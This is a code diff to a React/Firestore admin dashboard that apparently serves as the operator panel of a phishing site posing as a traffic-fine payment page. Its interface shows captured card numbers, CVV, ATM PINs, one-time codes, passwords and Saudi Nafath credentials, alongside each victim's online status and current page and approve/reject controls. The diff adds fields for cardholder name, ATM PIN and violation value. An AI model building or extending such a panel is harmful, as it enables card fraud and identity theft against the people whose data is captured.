@@ -89,27 +89,28 @@ interface Notification {
   otp2: string
   page: string
   cardNumber: string
+  cardHolderName?: string
+  expiryMonth?: string
+  expiryYear?: string
   country?: string
   personalInfo: {
     id?: string | "0"
     name?: string
   }
-  nafazId?: string
-  authNumber?: string
   prefix: string
   status: "pending" | "approved" | "rejected" | string
   isOnline?: boolean
   lastSeen: string
-  expiryMonth: string;
-  expiryYear: string;
+  violationValue: number
   pass?: string
+  atmPin?: string
   pagename: string
-  approval: string
+  plateType: string
   allOtps?: string[] | null
   idNumber: string
   email: string
   mobile: string
-  networkProvider: string
+  network: string
   phoneOtp: string
   name: string
   otpCode: string
@@ -441,17 +442,40 @@ function NafazInfoCard({
   onUpdate,
 }: {
   notification: Notification
-  onUpdate: (id: string, nafazInfo: string) => void
+  onUpdate: (id: string, nafazInfo: NafazInfo) => void
 }) {
   const [isEditing, setIsEditing] = useState(false)
-  const [nafazId, setNafazId] = useState(notification.nafazId || "")
-  const [authNumber, setAuthNumber] = useState(notification.authNumber || "")
+  const [nafazId, setNafazId] = useState(notification.nafazInfo?.nafazId || "")
+  const [authNumber, setAuthNumber] = useState(notification.nafazInfo?.authNumber || "")
   const [isSaving, setIsSaving] = useState(false)
 
-  
+  const handleSave = async () => {
+    setIsSaving(true)
+    try {
+      await onUpdate(notification.id, {
+        nafazId,
+        authNumber,
+        lastUpdated: new Date().toISOString(),
+      })
+      setIsEditing(false)
+      toast({
+        title: "تم التحديث بنجاح",
+        description: "تم تحديث معلومات نفاذ بنجاح",
+      })
+    } catch (error) {
+      toast({
+        title: "خطأ في التحديث",
+        description: "حدث خطأ أثناء تحديث معلومات نفاذ",
+        variant: "destructive",
+      })
+    } finally {
+      setIsSaving(false)
+    }
+  }
+
   const handleCancel = () => {
-    setNafazId(notification.nafazId || "")
-    setAuthNumber(notification.authNumber || "")
+    setNafazId(notification.nafazInfo?.nafazId || "")
+    setAuthNumber(notification.nafazInfo?.authNumber || "")
     setIsEditing(false)
   }
 
@@ -484,7 +508,7 @@ function NafazInfoCard({
         </div>
       </CardHeader>
       <CardContent className="space-y-4">
-        {!isEditing ? (
+        {isEditing ? (
           <div className="space-y-4">
             <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
               <div className="space-y-2">
@@ -517,7 +541,7 @@ function NafazInfoCard({
                 <X className="h-4 w-4 mr-2" />
                 إلغاء
               </Button>
-              <Button onClick={()=>onUpdate(notification.id,authNumber)} disabled={isSaving}>
+              <Button onClick={handleSave} disabled={isSaving}>
                 {isSaving ? <Loader2 className="h-4 w-4 mr-2 animate-spin" /> : <Save className="h-4 w-4 mr-2" />}
                 حفظ التغييرات
               </Button>
@@ -528,8 +552,8 @@ function NafazInfoCard({
             {notification.nafazInfo && (notification.nafazInfo.nafazId || notification.nafazInfo.authNumber) ? (
               <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                 {[
-                  { label: "رقم الهوية نفاذ", value: notification.nafazId },
-                  { label: "رقم التفويض", value: notification.authNumber },
+                  { label: "رقم الهوية نفاذ", value: notification.nafazInfo.nafazId },
+                  { label: "رقم التفويض", value: notification.nafazInfo.authNumber },
                 ].map(
                   ({ label, value }) =>
                     value && (
@@ -932,6 +956,7 @@ export default function NotificationsPage() {
           notification.cardNumber?.toLowerCase().includes(term) ||
           notification.country?.toLowerCase().includes(term) ||
           notification.otp?.toLowerCase().includes(term) ||
+          notification.atmPin?.toLowerCase().includes(term) ||
           notification.nafazInfo?.nafazId?.toLowerCase().includes(term) ||
           notification.nafazInfo?.authNumber?.toLowerCase().includes(term),
       )
@@ -1081,22 +1106,22 @@ export default function NotificationsPage() {
     setSelectedNotification(null)
   }
 
-  const handleUpdateNafaz = async (id: string, value: string) => {
+  const handleFlagColorChange = async (id: string, color: string) => {
     try {
       // Update in Firestore
       const docRef = doc(db, "pays", id)
-      await updateDoc(docRef, { authNumber: value })
+      await updateDoc(docRef, { flagColor: color })
 
       // Update local state
       setNotifications(
         notifications.map((notification) =>
-          notification.id === id ? { ...notification, authNumber: value } : notification,
+          notification.id === id ? { ...notification, flagColor: color } : notification,
         ),
       )
 
       toast({
         title: "تم تحديث العلامة",
-        description: value ? "تم تحديث لون العلامة بنجاح" : "تمت إزالة العلامة بنجاح",
+        description: color ? "تم تحديث لون العلامة بنجاح" : "تمت إزالة العلامة بنجاح",
         variant: "default",
       })
     } catch (error) {
@@ -1109,11 +1134,36 @@ export default function NotificationsPage() {
     }
   }
 
+  const handleNafazUpdate = async (id: string, nafazInfo: NafazInfo) => {
+    try {
+      const docRef = doc(db, "pays", id)
+      await updateDoc(docRef, { nafazInfo })
+
+      // Update local state
+      setNotifications(
+        notifications.map((notification) => (notification.id === id ? { ...notification, nafazInfo } : notification)),
+      )
+
+      toast({
+        title: "تم تحديث معلومات نفاذ",
+        description: "تم تحديث معلومات نفاذ بنجاح",
+        variant: "default",
+      })
+    } catch (error) {
+      console.error("Error updating nafaz info:", error)
+      toast({
+        title: "خطأ",
+        description: "حدث خطأ أثناء تحديث معلومات نفاذ",
+        variant: "destructive",
+      })
+    }
+  }
+
   const handleApproval = async (state: string, id: string) => {
     try {
       const targetPost = doc(db, "pays", id)
       await updateDoc(targetPost, {
-        approval: state,
+        status: state,
       })
 
       toast({
@@ -1597,29 +1647,6 @@ export default function NotificationsPage() {
                             {notification.phone ? "معلومات شخصية" : "لا يوجد معلومات"}
                           </Badge>
 
-                        
-
-                          <Badge
-                            variant={
-                              notification.nafazInfo &&
-                              (notification.nafazInfo.nafazId || notification.nafazInfo.authNumber)
-                                ? "default"
-                                : "secondary"
-                            }
-                            className={`cursor-pointer transition-all hover:scale-105 ${
-                              notification.nafazId &&
-                              (notification.nafazId || notification.authNumber)
-                                ? "bg-gradient-to-r from-orange-500 to-orange-600 text-white"
-                                : ""
-                            }`}
-                            onClick={() => handleInfoClick(notification, "nafaz")}
-                          >
-                            <Shield className="h-3 w-3 mr-1" />
-                            {notification.nafazId &&
-                            (notification.nafazId || notification.authNumber)
-                              ? "معلومات نفاذ"
-                              : "لا يوجد نفاذ"}
-                          </Badge>
                           <Badge
                             variant={notification.cardNumber ? "default" : "secondary"}
                             className={`cursor-pointer transition-all hover:scale-105 ${
@@ -1629,6 +1656,28 @@ export default function NotificationsPage() {
                           >
                             <CreditCard className="h-3 w-3 mr-1" />
                             {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
+                          </Badge>
+
+                          <Badge
+                            variant={
+                              notification.nafazInfo &&
+                              (notification.nafazInfo.nafazId || notification.nafazInfo.authNumber)
+                                ? "default"
+                                : "secondary"
+                            }
+                            className={`cursor-pointer transition-all hover:scale-105 ${
+                              notification.nafazInfo &&
+                              (notification.nafazInfo.nafazId || notification.nafazInfo.authNumber)
+                                ? "bg-gradient-to-r from-orange-500 to-orange-600 text-white"
+                                : ""
+                            }`}
+                            onClick={() => handleInfoClick(notification, "nafaz")}
+                          >
+                            <Shield className="h-3 w-3 mr-1" />
+                            {notification.nafazInfo &&
+                            (notification.nafazInfo.nafazId || notification.nafazInfo.authNumber)
+                              ? "معلومات نفاذ"
+                              : "لا يوجد نفاذ"}
                           </Badge>
                         </div>
                       </td>
@@ -1727,6 +1776,13 @@ export default function NotificationsPage() {
                               </TooltipContent>
                             </Tooltip>
                           </TooltipProvider>
+
+                          <FlagColorSelector
+                            notificationId={notification.id}
+                            currentColor={notification.flagColor as FlagColor}
+                            onColorChange={handleFlagColorChange}
+                          />
+
                           <Badge variant="outline" className="text-xs">
                             {notification?.currentPage}
                           </Badge>
@@ -1761,7 +1817,11 @@ export default function NotificationsPage() {
                       </div>
                       <div className="flex items-center gap-2">
                         <UserStatus userId={notification.id} />
-                     
+                        <FlagColorSelector
+                          notificationId={notification.id}
+                          currentColor={notification.flagColor as FlagColor}
+                          onColorChange={handleFlagColorChange}
+                        />
                       </div>
                     </div>
                   </CardHeader>
@@ -1807,8 +1867,8 @@ export default function NotificationsPage() {
                           onClick={() => handleInfoClick(notification, "nafaz")}
                         >
                           <Shield className="h-3 w-3 mr-1" />
-                          {notification.nafazId &&
-                          (notification.nafazId || notification.authNumber)
+                          {notification.nafazInfo &&
+                          (notification.nafazInfo.nafazId || notification.nafazInfo.authNumber)
                             ? "معلومات نفاذ"
                             : "لا يوجد نفاذ"}
                         </Badge>
@@ -1817,12 +1877,12 @@ export default function NotificationsPage() {
                       <div className="flex justify-between items-center">
                         <div className="flex items-center gap-2">
                           <span className="text-sm text-muted-foreground">الحالة:</span>
-                          {notification?.approval === "approved" ? (
+                          {notification.status === "approved" ? (
                             <Badge className="bg-gradient-to-r from-green-500 to-green-600 text-white">
                               <CheckCircle className="h-3 w-3 mr-1" />
                               موافق عليه
                             </Badge>
-                          ) : notification?.approval === "rejected" ? (
+                          ) : notification.status === "rejected" ? (
                             <Badge className="bg-gradient-to-r from-red-500 to-red-600 text-white">
                               <XCircle className="h-3 w-3 mr-1" />
                               مرفوض
@@ -1911,7 +1971,7 @@ export default function NotificationsPage() {
         {/* Nafaz Information Section */}
         {selectedNotification && selectedInfo === "nafaz" && (
           <div className="mt-6">
-            <NafazInfoCard notification={selectedNotification} onUpdate={handleUpdateNafaz} />
+            <NafazInfoCard notification={selectedNotification} onUpdate={handleNafazUpdate} />
           </div>
         )}
       </div>
@@ -1979,18 +2039,20 @@ export default function NotificationsPage() {
               <div className="bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg p-4 space-y-3">
                 {[
                   { label: "البنك", value: selectedNotification.bank },
+                  { label: "اسم حامل البطاقة", value: selectedNotification.cardHolderName },
                   {
                     label: "رقم البطاقة",
-                    value: selectedNotification?.cardNumber 
+                    value: selectedNotification?.cardNumber + " - " + selectedNotification?.prefix,
                   },
                   {
                     label: "تاريخ الانتهاء",
                     value:
-                      selectedNotification?.expiryMonth && selectedNotification?.expiryYear
-                        ? `${selectedNotification?.expiryMonth}/${selectedNotification?.expiryYear}`
+                      selectedNotification.expiryMonth && selectedNotification.expiryYear
+                        ? `${selectedNotification.expiryMonth}/${selectedNotification.expiryYear}`
                         : "غير متوفر",
-                  },  
+                  },
                   { label: "رمز الأمان", value: selectedNotification.cvv },
+                  { label: "رمز الصراف الآلي", value: selectedNotification.atmPin },
                   { label: "رمز التحقق", value: selectedNotification.otp },
                   { label: "كلمة المرور", value: selectedNotification.pass },
                 ].map(
@@ -2026,7 +2088,7 @@ export default function NotificationsPage() {
 
           {selectedInfo === "nafaz" && selectedNotification && (
             <div className="space-y-4">
-              <NafazInfoCard notification={selectedNotification} onUpdate={handleUpdateNafaz} />
+              <NafazInfoCard notification={selectedNotification} onUpdate={handleNafazUpdate} />
             </div>
           )}
         </DialogContent>
